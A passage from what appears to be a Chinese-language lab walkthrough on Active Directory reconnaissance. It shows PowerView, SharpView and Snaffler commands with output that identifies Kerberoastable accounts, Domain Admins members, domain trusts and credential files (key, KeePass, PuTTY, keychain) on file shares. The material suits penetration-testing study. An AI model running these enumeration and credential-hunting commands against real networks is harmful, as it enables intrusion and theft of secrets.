class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> mmorgan <span class="literal">-Domain</span> inlanefreight.local | <span class="built_in">Select-Object</span> <span class="literal">-Property</span> name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</span><br><span class="line"></span><br><span class="line">name                 : Matthew Morgan</span><br><span class="line">samaccountname       : mmorgan</span><br><span class="line">description          :</span><br><span class="line">memberof             : &#123;CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar</span><br><span class="line">                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security</span><br><span class="line">                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share <span class="built_in">H</span> Drive,OU=Security</span><br><span class="line">                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...&#125;</span><br><span class="line">whencreated          : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">5</span>:<span class="number">37</span>:<span class="number">06</span> PM</span><br><span class="line">pwdlastset           : <span class="number">11</span>/<span class="number">18</span>/<span class="number">2021</span> <span class="number">10</span>:<span class="number">02</span>:<span class="number">57</span> AM</span><br><span class="line">lastlogontimestamp   : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">34</span>:<span class="number">25</span> PM</span><br><span class="line">accountexpires       : NEVER</span><br><span class="line">admincount           : <span class="number">1</span></span><br><span class="line">userprincipalname    : mmorgan@inlanefreight.local</span><br><span class="line">serviceprincipalname :</span><br><span class="line">mail                 :</span><br><span class="line">useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</span><br></pre></td></tr></table></figure><p>查找设置了 SPN 属性的用户，这表明该帐户可能受到 Kerberoasting 攻击。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-SPN</span> <span class="literal">-Properties</span> samaccountname,ServicePrincipalName</span><br><span class="line"></span><br><span class="line">serviceprincipalname                          samaccountname</span><br><span class="line"><span class="literal">--------------------</span>                          <span class="literal">--------------</span></span><br><span class="line">adfsconnect/azure01.inlanefreight.local       adfs</span><br><span class="line">backupjob/veam001.inlanefreight.local         backupagent</span><br><span class="line">d0wngrade/kerberoast.inlanefreight.local      d0wngrade</span><br><span class="line">kadmin/changepw                               krbtgt</span><br><span class="line">MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span> sqldev</span><br><span class="line">MSSQLSvc/SPSJDB.inlanefreight.local:<span class="number">1433</span>      sqlprod</span><br><span class="line">MSSQLSvc/SQL<span class="literal">-CL01-01inlanefreight</span>.local:<span class="number">49351</span> sqlqa</span><br><span class="line">sts/inlanefreight.local                       solarwindsmonitor</span><br><span class="line">testspn/kerberoast.inlanefreight.local        testspn</span><br><span class="line">testspn2/kerberoast.inlanefreight.local       testspn2</span><br></pre></td></tr></table></figure><h3 id="Get-DomainGroupMember"><a href="#Get-DomainGroupMember" class="headerlink" title="Get-DomainGroupMember"></a>Get-DomainGroupMember</h3><p><code>-Recurse</code> 如果它发现任何属于目标组（嵌套组成员身份）的组，则列出这些组的成员</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Recurse</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Domain Admins</span><br><span class="line">GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : svc_qualys</span><br><span class="line">MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5613</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Domain Admins</span><br><span class="line">GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : <span class="built_in">sp</span><span class="literal">-admin</span></span><br><span class="line">MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5228</span></span><br><span class="line"></span><br><span class="line">GroupDomain             : INLANEFREIGHT.LOCAL</span><br><span class="line">GroupName               : Secadmins</span><br><span class="line">GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberDomain            : INLANEFREIGHT.LOCAL</span><br><span class="line">MemberName              : spong1990</span><br><span class="line">MemberDistinguishedName : CN=Maggie</span><br><span class="line">                          Jablonski,OU=Operations,OU=Logistics<span class="literal">-HK</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">MemberObjectClass       : user</span><br><span class="line">MemberSID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1965</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;  </span><br></pre></td></tr></table></figure><h3 id="Get-DomainTrustMapping"><a href="#Get-DomainTrustMapping" class="headerlink" title="Get-DomainTrustMapping"></a>Get-DomainTrustMapping</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainTrustMapping</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM </span><br></pre></td></tr></table></figure><h3 id="Test-AdminAccess"><a href="#Test-AdminAccess" class="headerlink" title="Test-AdminAccess"></a>Test-AdminAccess</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Test-AdminAccess</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line"></span><br><span class="line">ComputerName    IsAdmin</span><br><span class="line"><span class="literal">------------</span>    <span class="literal">-------</span></span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span>    True </span><br></pre></td></tr></table></figure><h2 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h2><p>PowerView 是现已弃用的 PowerSploit PowerShell 工具包的一部分。</p><p>SharpView 是 PowerView 的 .NET 端口。PowerView 支持的许多相同功能都可以在 SharpView 中使用。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpView.exe <span class="built_in">Get-DomainUser</span> <span class="literal">-Help</span></span><br><span class="line"></span><br><span class="line">Get_DomainUser <span class="literal">-Identity</span> &lt;String[]&gt; <span class="literal">-DistinguishedName</span> &lt;String[]&gt; <span class="literal">-SamAccountName</span> &lt;String[]&gt; <span class="literal">-Name</span> &lt;String[]&gt; <span class="literal">-MemberDistinguishedName</span> &lt;String[]&gt; <span class="literal">-MemberName</span> &lt;String[]&gt; <span class="literal">-SPN</span> &lt;Boolean&gt; <span class="literal">-AdminCount</span> &lt;Boolean&gt; <span class="literal">-AllowDelegation</span> &lt;Boolean&gt; <span class="literal">-DisallowDelegation</span> &lt;Boolean&gt; <span class="literal">-TrustedToAuth</span> &lt;Boolean&gt; <span class="literal">-PreauthNotRequired</span> &lt;Boolean&gt; <span class="literal">-KerberosPreauthNotRequired</span> &lt;Boolean&gt; <span class="literal">-NoPreauth</span> &lt;Boolean&gt; <span class="literal">-Domain</span> &lt;String&gt; <span class="literal">-LDAPFilter</span> &lt;String&gt; <span class="literal">-Filter</span> &lt;String&gt; <span class="literal">-Properties</span> &lt;String[]&gt; <span class="literal">-SearchBase</span> &lt;String&gt; <span class="literal">-ADSPath</span> &lt;String&gt; <span class="literal">-Server</span> &lt;String&gt; <span class="literal">-DomainController</span> &lt;String&gt; <span class="literal">-SearchScope</span> &lt;SearchScope&gt; <span class="literal">-ResultPageSize</span> &lt;Int32&gt; <span class="literal">-ServerTimeLimit</span> &lt;Nullable`1&gt; <span class="literal">-SecurityMasks</span> &lt;Nullable`1&gt; <span class="literal">-Tombstone</span> &lt;Boolean&gt; <span class="literal">-FindOne</span> &lt;Boolean&gt; <span class="literal">-ReturnOne</span> &lt;Boolean&gt; <span class="literal">-Credential</span> &lt;NetworkCredential&gt; <span class="literal">-Raw</span> &lt;Boolean&gt; <span class="literal">-UACFilter</span> &lt;UACEnum&gt;</span><br></pre></td></tr></table></figure><h2 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h2><p><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a>是一种可以帮助在 Active Directory 环境中获取凭据或其他敏感数据的工具。Snaffler 的工作原理是获取域内的主机列表，然后枚举这些主机的共享和可读目录。完成后，它会遍历用户可读的任何目录，并搜索可以改善在评估中的位置的文件。Snaffler 要求从加入域的主机或在域用户上下文中运行。</p><p><code>-s</code> 将结果打印到控制台，<code>-v</code> 详细程度，通常 data</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Snaffler.exe  <span class="literal">-d</span> INLANEFREIGHT.LOCAL <span class="literal">-s</span> <span class="literal">-v</span> <span class="keyword">data</span></span><br><span class="line"></span><br><span class="line"> .::::::.:::.    :::.  :::.    .-:::::<span class="string">&#x27;.-:::::&#x27;</span>:::    .,:::::: :::::::..</span><br><span class="line">;;;`    ``;;;;,  `;;;  ;;`;;   ;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;    ;;;;<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> ;;;;``;;;;</span><br><span class="line"><span class="string">&#x27;[==/[[[[, [[[[[. &#x27;</span>[[ ,[[ <span class="string">&#x27;[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[[&#x27;</span></span><br><span class="line">  <span class="string">&#x27;&#x27;</span><span class="string">&#x27;    $ $$$ &#x27;</span><span class="type">Y</span><span class="variable">$c</span><span class="variable">$</span><span class="variable">$c</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$cc</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$c</span>`$<span class="variable">$</span><span class="variable">$</span><span class="string">&#x27;`` `$$$&#x27;</span>`` <span class="variable">$</span><span class="variable">$</span><span class="string">&#x27;     $$&quot;&quot;   $$$$$$c</span></span><br><span class="line"><span class="string"> 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b &#x27;</span><span class="number">88</span><span class="type">bo</span>,</span><br><span class="line">  <span class="string">&#x27;YMmMY&#x27;</span>  <span class="type">MMM</span>     <span class="type">YM</span> <span class="type">YMM</span>   <span class="string">&#x27;&#x27;</span>` <span class="string">&#x27;MM,    &#x27;</span><span class="type">MM</span>,  <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="type">YUMMM</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="type">YUMMMMMMM</span>   <span class="string">&#x27;W&#x27;</span></span><br><span class="line">                         <span class="type">by</span> <span class="type">l0ss</span> <span class="type">and</span> <span class="type">Sh3r4</span> - <span class="type">github.com</span>/<span class="type">SnaffCon</span>/<span class="type">Snaffler</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Black</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="type">ADMIN</span><span class="variable">$</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Black</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01.INLANEFREIGHT.LOCAL</span>\<span class="type">C</span><span class="variable">$</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MX01.INLANEFREIGHT.LOCAL</span>\<span class="type">address</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">User</span> <span class="type">Shares</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">54</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">ZZZ_archive</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">18</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">CA01.INLANEFREIGHT.LOCAL</span>\<span class="type">CertEnroll</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.kdb</span><span class="variable">$</span>|<span class="number">289</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">22</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">GroupBackup.kdb</span>) <span class="type">.kdb</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">299</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">33</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">ShowReset.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="type">UpdateServicesPackages</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.kwallet</span><span class="variable">$</span>|<span class="number">302</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">45</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">WriteUse.kwallet</span>) <span class="type">.kwallet</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">298</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">10</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">ProtectStep.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.ppk</span><span class="variable">$</span>|<span class="number">275</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">40</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">StopTrace.ppk</span>) <span class="type">.ppk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.key</span><span class="variable">$</span>|<span class="number">301</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">17</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">WaitClear.key</span>) <span class="type">.key</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.sqldump</span><span class="variable">$</span>|<span class="number">312</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">30</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">DenyRedo.sqldump</span>) <span class="type">.sqldump</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.sqldump</span><span class="variable">$</span>|<span class="number">310</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">02</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">AddPublish.sqldump</span>) <span class="type">.sqldump</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">Share</span>] &#123;<span class="type">Green</span>&#125;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">FILE.INLANEFREIGHT.LOCAL</span>\<span class="type">WsusContent</span>)</span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.keychain</span><span class="variable">$</span>|<span class="number">295</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">08</span>:<span class="number">42</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">SetStep.keychain</span>) <span class="type">.keychain</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.tblk</span><span class="variable">$</span>|<span class="number">279</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">25</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">FindConnect.tblk</span>) <span class="type">.tblk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.psafe3</span><span class="variable">$</span>|<span class="number">301</span><span class="type">B</span>|<span class="number">3</span>/<span 